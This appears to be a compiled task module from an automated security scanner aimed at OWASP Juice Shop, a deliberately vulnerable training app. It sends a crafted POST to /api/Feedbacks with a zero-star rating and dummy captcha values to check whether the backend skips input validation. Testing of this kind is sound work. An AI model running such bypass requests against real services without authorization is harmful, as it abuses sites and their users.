"use strict";
/**
 * executor/tasks/AbuseZeroStarReview.ts
 * ---------------------------------------------------------------
 * Abuse Case: Avaliação com Zero Estrelas
 *
 * O frontend do Juice Shop só permite ratings de 1 a 5 estrelas.
 * Porém, a API /api/Feedbacks não valida o campo rating no backend.
 * Esta task testa se é possível submeter uma avaliação com rating 0
 * (ou negativo) diretamente via API.
 *
 * Juice Shop Challenge: "Post some feedback in another user's name"
 * / "Give a devastating zero-star feedback to the store"
 * Categoria OWASP: OTG-BUSLOGIC-008
 * ---------------------------------------------------------------
 */
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.abuseZeroStarReview = abuseZeroStarReview;
const axios_1 = __importDefault(require("axios"));
async function abuseZeroStarReview(jwt, baseUrl) {
    const headers = {
        'Authorization': `Bearer ${jwt}`,
        'Content-Type': 'application/json',
    };
    try {
        // Tenta criar um feedback com rating 0 (inválido pelo frontend)
        const response = await axios_1.default.post(`${baseUrl}/api/Feedbacks`, {
            comment: 'Automated security test — zero star rating bypass',
            rating: 0,
            captchaId: 0,
            captcha: '0',
        }, { headers, validateStatus: () => true, timeout: 10_000 });
        if (response.status === 200 || response.status === 201) {
            const feedbackId = response.data?.data?.id;
            return {
                title: 'Bypass de Validação de Rating — Zero Estrelas',
                severity: 'MEDIUM',
                category: 'BLV_INPUT_VALIDATION_BYPASS',
                description: 'É possível submeter avaliações com rating 0 (inválido pela UI) ' +
                    'diretamente via API. O backend não valida o intervalo permitido ' +
                    '(1–5), confiando apenas na validação do frontend Angular.',
                steps: [
                    `POST ${baseUrl}/api/Feedbacks com { rating: 0 }`,
                    `Servidor respondeu HTTP ${response.status}`,
                    feedbackId ? `Feedback criado com ID=${feedbackId}` : 'Feedback criado',
                ],
                evidence: JSON.stringify(response.data).substring(0, 300),
                discoveredAt: new Date(),
            };
        }
        return null;
    }
    catch (err) {
        console.warn(`[Task] AbuseZeroStarReview falhou: ${err.message}`);
        return null;
    }
}
//# sourceMappingURL=AbuseZeroStarReview.js.map